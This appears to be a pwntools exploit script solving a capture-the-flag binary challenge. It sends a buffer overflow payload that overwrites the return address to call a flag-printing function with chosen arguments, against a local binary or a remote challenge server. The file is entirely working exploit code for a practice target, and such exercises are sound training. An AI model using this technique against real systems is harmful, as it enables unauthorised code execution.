from pwn import *

context.log_level = "debug"
context.terminal = ['urxvt', '-e', 'sh', '-c']

CURR_DIR = os.path.dirname(os.path.realpath(__file__))
PATH = CURR_DIR + "/"
BINARY = "./vuln"
HOST = "138.68.155.238"
PORT = 30052


gdbscript = '''
b vuln
# b *0x080491e2
b *0x8049246
continue
'''

def attach(r):
    if type(r) == process:
        gdb.attach(r, gdbscript)


def prepare():
    r.sendlineafter(b"You know who are 0xDiablos: ", b"A"*180 + b"BBBB" + b"CCCC"+ p32(0x080491e2) + b"XXXX" + p32(0xdeadbeef) + p32(0xc0ded00d))


def exploit():
    info("prepare")
    prepare()
    r.recvline()
    r.recvline()
    flag = r.recvline()
    success(b"flag: " + flag)


if __name__ == '__main__':
    os.chdir(PATH)
    if len(sys.argv) > 1:
        r = remote(HOST, PORT)
    else:
        r = process(BINARY)
        attach(r)

    exploit()